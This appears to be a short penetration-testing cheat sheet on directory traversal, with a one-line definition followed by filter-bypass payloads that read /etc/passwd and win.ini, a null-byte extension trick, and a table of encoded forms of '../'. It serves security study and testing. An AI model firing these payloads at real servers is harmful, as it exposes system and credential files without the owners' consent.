# 🟩 Directory Traversal

Directory traversal (or path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files

## <mark style="color:red;">Bypass path traversal filters</mark>

```
..\..\..\windows\win.ini --> Windows OS
../../../etc/passwd
....//....//....//etc/passwd
/var/www/images/../../../etc/passwd 
../../../etc/passwd%00.png --> null byte bypass
```

**URL Encoding**

| char | encode          |
| ---- | --------------- |
| ../  | %2e%2e%2f       |
| ../  | %252e%252e%252f |
| ../  | ..%252f         |
| ../  | ..%c0%af        |
| ../  | ..%ef%bc%8f     |
